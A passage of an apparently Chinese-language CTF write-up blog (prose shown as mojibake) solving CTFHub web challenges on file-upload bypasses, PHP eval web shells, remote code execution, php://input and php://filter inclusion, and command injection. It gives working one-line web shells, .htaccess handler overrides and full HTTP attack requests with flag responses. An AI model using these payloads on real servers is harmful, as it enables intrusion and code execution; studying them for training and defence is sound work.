class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>é€šè¿‡ä¸­å›½èšå‰‘è¿›è¡Œæ§åˆ¶ï¼Œæ‰¾åˆ°flag</li></ol><h4><span id="å‰ç«¯éªŒè¯">å‰ç«¯éªŒè¯</span></h4><ul><li>å’Œæ— éªŒè¯å·®ä¸å¤šï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯å‰ç«¯æ£€æŸ¥äº†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åã€‚</li></ul><ol><li>ç¦ç”¨jsæ¥è§£å†³</li><li>ä½¿ç”¨burpsuiteï¼Œå…ˆå°†ä¸€å¥è¯æœ¨é©¬åç¼€ä¿®æ”¹æˆ.pngï¼Œç„¶åæŠ“åŒ…åç¼€ä¿®æ”¹æˆphpï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„</li></ol><h4><span id="htaccess">.htaccess</span></h4><blockquote><p>htaccess æ–‡ä»¶æ˜¯ Apache æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡ htaccess æ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ 301 é‡å®šå‘ã€è‡ªå®šä¹‰ 404 é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p></blockquote><ol><li><p>ä½¿ç”¨ FilesMatch å‘½ä»¤ç”Ÿæˆä¸€ä¸ª.htaccess æ–‡ä»¶è¿›è¡Œä¸Šä¼ ï¼Œç»•è¿‡ç™½åå•ä¸­çš„æ¼æ´</p><ul><li><p>éœ€è¦æ„é€ .htaccessæ–‡ä»¶ï¼Œå…¶ä¸­<code>FilesMatch</code> å°±æ˜¯æˆ‘ä»¬è¦ä¸Šä¼ çš„æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">payload</span>&quot;&gt;</span></span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œåå­—ä¸ºFilesMatchè®¾ç½®çš„<code>payload</code></p></li></ul></li><li><p>ä½¿ç”¨passthruæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</p><ul><li>ç¬¬ä¸€æ­¥ä¸€æ ·æ˜¯æ„é€ .htaccessæ–‡ä»¶</li><li>ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨passthruæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /var/www/&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®<code>http://xxxx/upload/payload</code>æ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;cat /var/www/html/flag_828011517.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ .htaccessæ–‡ä»¶</p><ul><li>å¥è¯çš„ä½œç”¨æ˜¯ï¼šè®©jpgæ–‡ä»¶ä¸­çš„phpè¯­å¥æ‰§è¡Œï¼Œè¿™å¥è¯­å¥æ”¾åˆ°.htaccessæ–‡ä»¶ä¸­ï¼ŒApacheè¿è¡Œçš„æ—¶å€™ä¼šè§£æè¿™ä¸ªæ–‡ä»¶ä¸­çš„é…ç½®ï¼Œæ£€æµ‹åˆ°è¿™å¥è¯ä»¥åï¼Œjpgæ–‡ä»¶ä¸­çš„phpè¯­å¥æ‰ä¼šæ‰§è¡Œ</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><ul><li>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä»¥.jpgç»“å°¾</li><li>ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥</li></ul></li></ol><h4><span id="mime">MIME</span></h4><ul><li>ä¸Šä¼ phpæ–‡ä»¶ï¼Œå¹¶å°†content-typeæ”¹æˆimage&#x2F;pngå³å¯</li></ul><h4><span id="æ–‡ä»¶å¤´æ£€æŸ¥">æ–‡ä»¶å¤´æ£€æŸ¥</span></h4><p>åŸç†ï¼šæœåŠ¡å™¨ä¼šæ£€æŸ¥pngçš„å¤´æ ¼å¼</p><ul><li><p>æˆªå›¾ä¸Šä¼ æ–‡ä»¶ï¼Œé€šè¿‡<code>burpsuite</code>è¿›è¡Œä»£ç†</p></li><li><p>åœ¨å›¾ç‰‡åé¢æ·»åŠ ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹æ–‡ä»¶åç¼€.php</p></li><li><p>ä½¿ç”¨èšå‰‘è¿æ¥</p></li></ul><h4><span id="00æˆªæ–­">00æˆªæ–­</span></h4><p><strong>%00çš„ä½¿ç”¨æ˜¯åœ¨è·¯å¾„ä¸Š</strong></p><p>å°±æ˜¯åœ¨.phpæ–‡ä»¶ååŠ ä¸Š%00åæ¥.jpgï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡å¯¹phpæ–‡ä»¶çš„è¿‡æ»¤ã€‚åœ¨æ‰§è¡Œæ—¶ï¼Œ%00ä¼šæŠŠåé¢çš„.jpgæˆªæ–­ï¼Œæ‰€ä»¥æ‰§è¡Œçš„æ—¶å€™ä»–æ‰§è¡Œçš„ä»ç„¶æ˜¯å‰é¢çš„.phpæ–‡ä»¶ã€‚å°±å¯ä»¥å®ç°æˆ‘ä»¬çš„é©¬å­æ–‡ä»¶çš„æ‰§è¡Œã€‚</p><h4><span id="åŒå†™åç¼€">åŒå†™åç¼€</span></h4><p>åŸç†ï¼šæœåŠ¡å™¨ä¼šæ›¿æ¢åç¼€â€™phpâ€™-&gt;â€™â€™ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ‹¼æ¥åç¼€ä¸ºâ€pphphpâ€å³å¯</p><h3><span id="rce">RCE</span></h3><h4><span id="evalæ‰§è¡Œ">evalæ‰§è¡Œ</span></h4><p>è¿›å…¥åé¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°è¯•åœ¨URLä¸­å¸¦ä¸Šåä¸ºcmdçš„å‚æ•°ï¼šï¼ˆæ­¤å¤„<code>system()</code>å‡½æ•°çš„ä½œç”¨ä¸ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¾“å‡ºæ‰§è¡Œç»“æœï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system(&quot;pwd&quot;);</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸ æ­¤å¤„éœ€è¦æ³¨æ„å‚æ•°ç»“å°¾ä¸€å®šä¸èƒ½çœç•¥<code>;</code>ï¼Œæ»¡è¶³PHPè¯­æ³•æ‰å¯ä»¥æ‰§è¡ŒæˆåŠŸã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system(&quot;ls%20/&quot;);</span><br><span class="line">.../?cmd=system(&quot;cat%20/flag_xxxx&quot;);</span><br></pre></td></tr></table></figure><h4><span id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</span></h4><ul><li>è€ƒå¯Ÿ<code>include</code>å‡½æ•°</li></ul><p>è®¿é—®shellé¡µé¢ï¼Œå‘ç°æœ‰ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‡å¦‚åœ¨index.phpä¸­includeäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆä¸ç®¡è¿™ä¸ªæ–‡ä»¶åç¼€æ˜¯ä»€ä¹ˆ  è¿™ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹å°†ä¼šç›´æ¥å‡ºç°åœ¨index.phpä¸­ï¼Œæ‰€ä»¥è¿™é“é¢˜çš„payloadæ„é€ æ€è·¯å°±æ˜¯æŠŠshell.txté‡Œçš„å†…å®¹æƒ³åŠæ³•æ”¾åˆ°index.phpä¸­å»æ ¹æ®æºç æ„é€ payloadï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨èšå‰‘åç¼€åŠ ä¸Špayloadå³å¯</p><h4><span id="phpx2fx2finput">php:&#x2F;&#x2F;input</span></h4><p><a href="https://blog.csdn.net/qq_51295677/article/details/123462929">å‚è€ƒæ–‡çŒ®</a></p><p>å¸¸ç”¨åˆ°ä¼ªåè®®çš„<code>php://input</code>å’Œ<code>php://filter</code>.å…¶ä¸­<code>php://input</code>è¦æ±‚<code>allow_url_include</code>è®¾ç½®ä¸º<code>On</code></p><ul><li>ä½¿ç”¨burp suiteçš„repeaterå‘é€è¯·æ±‚ï¼Œæ„é€ è¯·æ±‚æŠ¥æ–‡</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-9144f5dff97c39a1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag_5734&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿”å›</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:05:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;8c628d8ea62d6dc8316f15c3&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h4><span id="è¯»å–æºä»£ç ">è¯»å–æºä»£ç </span></h4><p><a href="https://blog.csdn.net/qq_61839115/article/details/128593214">å‚è€ƒ</a></p><ul><li>è€ƒç‚¹ï¼š<code>php://filter</code>å¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå…·æœ‰å››ä¸ªå‚æ•°ã€‚</li></ul><table><thead><tr><th>åç§°</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td><td>å¿…é€‰</td></tr><tr><td>read&#x3D;&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ</td><td>ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ</td><td>ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ read&#x3D; æˆ– write&#x3D; ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td><td></td></tr></tbody></table><p>è¿™é“é¢˜å°±ç›´æ¥æ„é€ payloadäº†</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure><p>æœ‰äº›æ¯”èµ›èµ›é¢˜æƒ…å†µä¸‹è¿˜è¦ç”¨base64è¾“å‡º</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=<span class="built_in">convert</span>.base64-encode/resource=/flag </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨burp suite</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://filter/resource=/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-d9e9d5fbc32a97fe.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:34:10 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>106</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;d797f76a6ac67e494a84fa86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">flag in <span class="tag">&lt;<span class="name">code</span>&gt;</span>/flag<span class="tag">&lt;/<span class="name">code</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h4><span id="è¿œç¨‹åŒ…å«">è¿œç¨‹åŒ…å«</span></h4><ul><li>è§£æ³•1ï¼šå’Œinputé‚£é¢˜è§£æ³•ä¸€æ ·</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-795660de70a9ad8e.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:53:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;db258363d74e58371cd85c86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag?<span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><ul><li>è§£æ³•2ï¼š</li></ul><p> é¢˜ç›®ç›®çš„æ˜¯æƒ³è®©æˆ‘ä»¬è‡ªå·±æ­ä¸ªæœåŠ¡å™¨ï¼Œç„¶åè®©é¶æœºè¿œç¨‹åŒ…å«æˆ‘ä»¬çš„ä»£ç ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰ç§ŸèµVPSã€‚</p><p><a href="https://www.wolai.com/ctfhub/64arrieDUUPZTc1eFm6LLC">å‚è€ƒç­”æ¡ˆ</a></p><h4><span id="å‘½ä»¤æ³¨å…¥">å‘½ä»¤æ³¨å…¥</span></h4><p> å‘½ä»¤è¡Œæ³¨å…¥æ¼æ´æ˜¯æŒ‡webåº”ç”¨ç¨‹åºä¸­è°ƒç”¨äº†ç³»ç»Ÿå¯æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼Œè€Œä¸”è¾“å…¥å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¦‚æœé»‘å®¢æ‹¼æ¥äº†æ³¨å…¥å‘½ä»¤ï¼Œå°±å¯ä»¥è¿›è¡Œéæ³•æ“ä½œäº†ã€‚</p><p><strong>Windowsç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</strong></p><ol><li>â€œ|â€ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ||â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡æ‰è¡Œã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol><p><strong>Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</strong></p><ol><li>â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚</li><li>â€œ||â€ï¼šå½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦